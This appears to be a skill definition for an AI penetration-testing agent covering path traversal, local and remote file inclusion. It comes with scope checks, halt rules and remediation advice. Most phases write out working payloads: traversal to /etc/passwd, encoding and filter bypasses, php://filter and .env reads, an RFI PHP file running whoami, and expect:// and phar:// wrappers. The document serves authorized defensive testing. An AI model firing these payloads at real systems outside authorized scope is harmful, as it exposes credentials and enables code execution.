---
name: path-traversal-hunter
description: "Tests file-reference inputs for directory traversal (`../../etc/passwd`), Local File Inclusion (read server source / config), and Remote File Inclusion (RFI → RCE if PHP `allow_url_include` or similar is enabled). Covers encoding bypasses (`%2e%2e%2f`, double-encoding, null-byte), filter-recursive bypass (`....//`), Unicode, and protocol wrappers (`file://`, `php://filter`). Use when parameters like `file=`, `page=`, `template=`, `item=`, `path=`, `doc=`, `download=` appear in the inventory; when features handle file uploads / downloads / user themes; or when the orchestrator identifies file-oriented features. Produces findings with CWE-22 / CWE-98 mapping and allowlist + canonicalization remediation. Defensive testing only — HARMLESS PROBES (read-only files), post-RCE halt if RFI triggers code execution."
model: sonnet
allowed-tools: >
  Read, Grep, Glob, Write(path:.claude/planning/**),
  WebFetch,
  Bash(curl:*), Bash(wget:*), Bash(httpx:*), Bash(ffuf:*),
  Bash(gobuster:*), Bash(nuclei:*), Bash(jq:*), Bash(arjun:*),
  Bash(gf:*), Bash(gau:*), Bash(waybackurls:*),
  Bash(nmap:--script=safe*), Bash(nmap:-sV), Bash(nmap:-Pn),
  Bash(dig:*), Bash(host:*), Bash(whois:*),
  Bash(openssl:s_client*), Bash(openssl:x509*)
metadata:
  version: 1.0.0
  category: security-testing
  subcategory: injection
  authorization_required: true
  tier: T2
  source_methodology: "Guia Técnico_ Vulnerabilidades de Inclusão de Arquivos e Traversal.md"
  service_affecting: false
  composed_from: []
---

# Path Traversal / File Inclusion Hunter

## Goal

Test file-reference inputs for directory traversal (reading files
outside the intended directory), Local File Inclusion (LFI —
including a local file that the server then parses or executes),
and Remote File Inclusion (RFI — fetching and executing an
attacker-controlled remote file). This skill implements
WSTG-AUTHZ-01 / WSTG-INPV-11 adjacencies and maps findings to
CWE-22 (Improper Limitation of a Pathname to a Restricted
Directory — Path Traversal), CWE-98 (Improper Control of
Filename for Include/Require Statement — RFI), and CWE-73 (File
Manipulation). The goal is to hand the backend team a concrete
list of file-reference inputs with safe-read evidence and
canonicalization + allowlist remediation.

## When to Use

- Parameters named `file=`, `page=`, `template=`, `item=`,
  `path=`, `doc=`, `download=`, `theme=`, `include=`, `img=`
  appear in the inventory.
- Features handle file uploads / downloads / language selection /
  template rendering / PDF generation / themes.
- Application stack is file-oriented (PHP `include()`, Python
  `open()`, Java `FileReader`, Node `fs.readFile`).
- The orchestrator selects this skill after `web-recon-active`
  surfaces file-oriented endpoints.

## When NOT to Use

- For SSRF (server fetches arbitrary URLs, not local files) —
  use `ssrf-hunter`.
- For command injection via filename parameters — use
  `command-injection-hunter`.
- For deserialization via file-based serialized objects — use
  `deserialization-hunter`.
- For XXE that happens to read files via XML entities — use
  `xxe-hunter`.
- Any asset not listed in `.claude/security-scope.yaml` or whose
  `testing_level` is not `active`.

## Authorization Check (MANDATORY FIRST STEP)

Before ANY outbound activity:

1. Read `.claude/security-scope.yaml`. If the file doesn't exist
   or doesn't parse, halt and report.
2. Confirm the intended target appears in the `assets` list AND
   its `testing_level` is `active`.
3. Traversal probes use harmless READ-ONLY files (`/etc/passwd`,
   `/etc/hostname`, `Windows/boot.ini`, `/proc/version`). NEVER:
   - Read `/etc/shadow`, `/root/.ssh/id_rsa`, or other root-only
     paths (even to prove reachability) — standard severity with
     world-readable files is enough
   - Use RFI payloads that execute code unless the scope
     explicitly approves `rfi_rce_testing: approved`
   - Write files via path traversal (e.g., path=`/var/www/...`)
     — this is a read-side skill
4. If RFI triggers code execution, treat as RCE and STOP at the
   proof — same post-RCE halt as `ssti-hunter`, `command-injection-hunter`,
   `deserialization-hunter`.
5. RFI testing uses the authorized OOB listener to host the
   "malicious" file; listener MUST be in scope.
6. Log the authorization check to
   `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log
   with status `running`.

## Inputs

The skill expects the caller to provide:

- `{issue}`: the planning folder name
- `{target}`: the asset identifier from security-scope.yaml
- `{scope_context}`: optional — specific file parameters to focus
  on
- `{user_a}`: authenticated session if endpoints are behind auth
- `{oob_listener}`: authorized OOB listener URL for RFI testing

## Methodology

### Phase 1: Candidate Inventory

1. **Extract file-reference parameters**
   [OTGv4, p. 348; WSTG v4.2, p. 999]

   Do: From `API_INVENTORY.md` / `ATTACK_SURFACE.md`, extract
   parameters whose names or values suggest file-paths:
   - Direct file params: `file`, `filename`, `path`, `doc`,
     `download`, `page`, `template`, `theme`, `lang`, `include`
   - Upload-response params: echoed filename in response
   - Path segments: `/files/{something}.html`

   Record: `.claude/planning/{issue}/path-traversal-targets.md`.

### Phase 2: Initial Traversal Probe

2. **Baseline + single-traversal confirmation**
   [WAHH, Ch 10, p. 372]

   Do: For each candidate, test whether path-joining understands
   traversal sequences at all:
   ```
   Baseline:   file=docs/intro.md
   Probe:      file=docs/../docs/intro.md
   ```

   Vulnerable signal: The probe response is identical to the
   baseline — the server resolves `..` and the traversal reaches
   the same file. Indicates traversal is processed.

   Not-vulnerable signal: The probe response differs (error,
   different content, 404) — the server may be blocking
   traversal characters.

   Record: Per-param traversal-processing status.

### Phase 3: System-Root Traversal

3. **Unix `/etc/passwd` probe** [WAHH, Ch 21, p. 834]

   Do: Progressively climb out of the web root:
   ```
   file=../../../etc/passwd
   file=../../../../etc/passwd
   file=../../../../../etc/passwd
   file=../../../../../../etc/passwd
   ```

   Typical web-root depth: 3-5 `../` segments. If N=5 doesn't
   reach root, try N=7, N=10.

   Vulnerable response: Response contains `root:x:0:0:root:/root:/bin/bash`
   or similar `/etc/passwd` content.

   Not-vulnerable response: 404, 403, generic error, or file
   content truncated in a clearly-filtered way.

   Record: Per-param traversal depth + file contents.

4. **Windows traversal probe** [WAHH, Ch 21, p. 834]

   Do: For Windows targets:
   ```
   file=..\..\..\..\Windows\boot.ini
   file=..\..\..\..\Windows\System32\drivers\etc\hosts
   ```

   Vulnerable response: Response contains boot.ini / hosts
   contents.

### Phase 4: Encoding Bypass

5. **URL-encoded traversal** [WAHH, Ch 10, p. 375]

   Do: If plain `../` is filtered, retry with:
   ```
   %2e%2e%2fetc/passwd
   ..%2fetc/passwd
   %2e%2e%5cetc\passwd         (Windows backslash)
   ```

6. **Double-encoded traversal** [OTGv4, p. 354]

   Do:
   ```
   %252e%252e%252fetc/passwd
   ```

   Works when the server URL-decodes twice (e.g., once in the
   web server, once in the app).

7. **Unicode encoding** [OTGv4, p. 354]

   Do:
   ```
   %u002e%u002e%u002fetc/passwd        (IIS legacy)
   %c0%ae%c0%ae%c0%afetc/passwd        (overlong UTF-8)
   ```

8. **Null-byte termination**
   [Bug Bounty Bootcamp, Ch 19, p. 325]

   Do: If the server appends an extension to the file (e.g.,
   `file + ".jpg"`), use a null byte to terminate early (legacy
   PHP < 5.3 and some older stacks):
   ```
   file=../../../../etc/passwd%00.jpg
   ```

   Vulnerable response: Server reads `etc/passwd` ignoring the
   `.jpg` suffix.

9. **Recursive strip bypass** [OTGv4, p. 354]

   Do: If the server strips `../` recursively, use:
   ```
   ....//....//....//etc/passwd
   ....\/....\/....\/etc/passwd
   ..././..././..././etc/passwd
   ```

   The stripper removes the MIDDLE `..` but the outer `..` /
   `/` remain and form a valid traversal post-strip.

### Phase 5: Local File Inclusion (LFI) — Code Disclosure

10. **PHP config / source disclosure**
    [WAHH, Ch 10, p. 383]

    Do: For PHP targets, attempt to include / read config files:
    ```
    file=../config/database.php
    file=../.env
    file=../../wp-config.php
    ```

    Vulnerable response: PHP source is rendered as TEXT (not
    executed) — indicates `include`/`require` without proper
    sanitization on a non-PHP-mode endpoint, or
    `file_get_contents`. Look for `<?php ... ?>` in the response.

    Alternative: `php://filter` stream wrapper to base64-encode
    the source (bypasses PHP execution):
    ```
    file=php://filter/convert.base64-encode/resource=config
    ```

    The base64-decoded output is the raw source.

11. **Java / Python / Node config disclosure**
    [Common patterns]

    Do: Language-appropriate config files:
    - Java: `../WEB-INF/web.xml`, `../META-INF/context.xml`
    - Python: `../settings.py`, `../.env`, `../config.py`
    - Node: `../.env`, `../config.json`, `../package.json`

### Phase 6: Remote File Inclusion (RFI)

12. **RFI detection via OOB callback**
    [WAHH, Ch 10, p. 383]

    Do: For targets that may use `include()` with unsanitized
    URL input (PHP `allow_url_include=On` or equivalent), submit:
    ```
    file=http://{oob_listener}/rfi-probe.txt
    ```

    Host a simple text file at the listener.

    Vulnerable signal: Listener receives a fetch AND the
    response body contains the file's content (indicating the
    server fetched + included).

    If the hosted file is PHP (and scope permits
    `rfi_rce_testing: approved`), execution may occur:
    ```
    file=http://{oob_listener}/rfi-rce-test.php
    # Where rfi-rce-test.php contains: <?php echo `whoami`; ?>
    ```

    Vulnerable: Response body contains `www-data` / `apache` /
    similar.

    **Post-RCE halt**: Stop at the first confirmation. Do not
    pivot.

    Record: RFI findings are Critical; cross-reference
    `command-injection-hunter` for any further exploration of
    the gained RCE.

### Phase 7: Protocol Wrappers

13. **Alternative protocol wrappers** [WAHH, Ch 10]

    Do: Test non-file schemes for LFI-style reads:
    ```
    file:///etc/passwd
    data://text/plain;base64,PD9waHAgcGhwaW5mbygpOw==   # PHP info via data://
    expect://id                                            # PHP expect:// for RCE
    zip://path/to/zip.zip#internal/file                   # zip wrapper
    phar://path/to/phar.phar/file                         # Phar deserialization
    ```

    Vulnerable signal: Any of these causes the server to read
    via the alternative scheme. `phar://` is particularly
    dangerous — triggers deserialization (cross-reference
    `deserialization-hunter`).

## Payload Library

Full catalog in `references/payloads.md`. Categories:

- **Standard traversal**: `../`, `..\`, Unix + Windows
- **Encoding variants**: URL, double-URL, Unicode, overlong UTF-8
- **Recursive-strip bypass**: `....//`, `....\/`
- **Null-byte (legacy)**: `%00.jpg` suffix-trick
- **Protocol wrappers**: `file://`, `php://filter`, `data://`,
  `expect://`, `zip://`, `phar://`
- **LFI config-disclosure paths**: per-language config files
- **RFI probes**: OOB-hosted text + (gated) PHP

## Output Format

Findings append to `.claude/planning/{issue}/SECURITY_AUDIT.md` per
the schema in `.claude/skills/_shared/finding-schema.md`.

Specific to this skill:

- **CWE**: CWE-22 for path traversal. CWE-98 for RFI. CWE-73
  (File Manipulation) for write-side variants (not tested by
  this skill). CWE-200 for config-file disclosure via LFI.
- **OWASP**: WSTG-AUTHZ-01, WSTG-INPV-11. A03:2021 (Injection)
  includes file inclusion. For APIs, API8:2023 (Security
  Misconfiguration).
- **CVSS vectors**: `/etc/passwd` read —
  `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`. Config file read (DB
  creds, API keys) — `...C:H/I:N/A:N`. RFI → RCE —
  `...C:H/I:H/A:H`. `phar://` deserialization — `...C:H/I:H/A:H`.
- **Evidence**: the exact traversal / include payload, the
  response containing the read file (truncated if huge;
  hash-redacted if it contains secrets), and the bypass vector
  used (plain / encoded / recursive-strip / wrapper).
- **Remediation framing**: backend engineer. Include:
  - Canonicalization BEFORE allowlist check (resolve `../`,
    decode URL/unicode, then check)
  - Allowlist of permitted filenames / extensions (not a
    denylist of traversal sequences)
  - Opaque-identifier pattern (`?doc=42` → server looks up
    actual file)
  - PHP: `allow_url_include=Off`, `open_basedir` restricted
  - Language-safe file APIs: `pathlib.Path.resolve()` in Python,
    `fs.realpath` + prefix check in Node
  - chroot / container isolation so traversal can't escape the
    app's filesystem view

The skill also updates:

- `.claude/planning/{issue}/STATUS.md` — its row under Phase 7: Security
- `.claude/planning/{issue}/SECURITY_AUDIT.md` Skills Run Log

## Quality Check (Self-Review)

Before marking complete, verify:

- [ ] Every finding cites the specific bypass vector used (plain
      / URL-encoded / recursive / wrapper)
- [ ] No world-unreadable files (`/etc/shadow`, SSH keys) were
      probed
- [ ] RFI tests used only scope-approved OOB-hosted files
- [ ] If RFI triggered execution, post-RCE halt was honored and
      handoff to `command-injection-hunter` (or retro findings
      cross-reference) happened
- [ ] Config-file findings redact any captured secrets (first/last
      4 chars + hash)
- [ ] `phar://` findings cross-reference `deserialization-hunter`
- [ ] Skills Run Log row updated from `running` to `complete` or
      `halted:{reason}`

## Common Issues

- **Universal-200 body contains "not found"**: The server
  returns 200 even for missing files; the body says "File not
  found". Distinguish by checking the body content against a
  known-good baseline.

- **WAF blocks traversal strings**: An edge WAF blocks `../`
  before it reaches the app. The application itself might be
  safe OR might be vulnerable — can't tell from external view.
  Test whether encoded variants reach the app to distinguish
  WAF-only defense vs app-level.

- **Response size differences that aren't traversal**: Variable
  response sizes under normal load can masquerade as a traversal
  signal. Re-run suspicious probes 3 times.

- **Target-infrastructure 404 vs server's own 404**: A dangling
  CNAME's third-party 404 (`subdomain-takeover-hunter` territory)
  is different from the target's own "file not found". Confirm
  the server headers match the target.

- **RFI that looks successful but isn't executing**: The server
  fetches the OOB file (listener hit) but doesn't execute it —
  just includes the content as raw text. Still a finding (content
  injection if the file has HTML or JS) but not RCE. Distinguish
  by the response body: if PHP-source shows as text, not
  executed.

- **Symbolic-link traps**: Some apps dereference symlinks
  server-side but reject traversal in the raw input. The
  symlink attack requires the ability to create a symlink first
  — usually not available to an unauthenticated attacker. Note
  as "post-authentication" if relevant.

## References

- `references/payloads.md` — full encoding + wrapper catalog

External:
- CWE-22: https://cwe.mitre.org/data/definitions/22.html
- CWE-98: https://cwe.mitre.org/data/definitions/98.html
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- WSTG-AUTHZ-01: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include

## Source Methodology

Converted from:
`pentest-agent-development/notebooklm-notes/Guia Técnico_ Vulnerabilidades de Inclusão de Arquivos e Traversal.md`

Grounded in:
- The Web Application Hacker's Handbook, Ch 10 + Ch 21
- Bug Bounty Bootcamp, Ch 19 (File Inclusion)
- OWASP WSTG v4.2 (WSTG-AUTHZ-01, WSTG-INPV-11, OTGv4)

Conversion date: 2026-04-24
Conversion prompt version: 1.0
